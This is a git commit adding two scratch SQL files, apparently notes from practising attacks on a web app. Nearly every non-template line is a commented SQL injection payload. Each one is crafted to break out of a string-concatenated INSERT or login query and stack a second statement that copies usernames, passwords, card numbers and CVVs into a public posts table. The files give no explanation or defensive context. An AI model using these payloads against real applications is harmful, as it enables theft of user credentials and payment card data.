7ef0106d9631538089f1a3f35ddef5e4cc3d9fbc
adam.darcy <adam.darcy@workday.com>
2022-11-10 14:57:19 +0000

    Initial Commit

---
+++ scratch.sql
@@ -0,0 +1,11 @@
+/* 
+ * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
+ * Click nbfs://nbhost/SystemFileSystem/Templates/Other/SQLTemplate.sql to edit this template
+ */
+/**
+ * Author:  adam.darcy
+ * Created: 5 Nov 2022
+ */
+
+# INSERT into posts(content,title,user) values ('" + "';INSERT into posts(content,title,user) SELECT id, username, password FROM users WHERE id=1 # + "','" + title + "','" + user + "')
+select * from carddetail
---
+++ scratch2.sql
@@ -0,0 +1,15 @@
+/* 
+ * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
+ * Click nbfs://nbhost/SystemFileSystem/Templates/Other/SQLTemplate.sql to edit this template
+ */
+/**
+ * Author:  adam.darcy
+ * Created: 7 Nov 2022
+ */
+# INSERT into posts(content,title,user) values ('" + content + "' OR INSERT into posts(content, title, user) SELECT id, username, password FROM users WHERE id=6 # "','" + title + "','" + user + "')
+# select * from carddetail
+
+# select * from users where username='" "'; INSERT into posts(content, title, user) SELECT CAST(cardno as varchar), CAST(cvv as varchar), CAST(id as varchar) FROM users WHERE id=3  # +user+"' and password='"+pass+"'
+select * from users
+
+# INSERT into posts(content,title,user) values ('" + content + "'; INSERT into posts(content, title, user) SELECT id, username, password FROM users WHERE id=7 # ,'" + user + "')
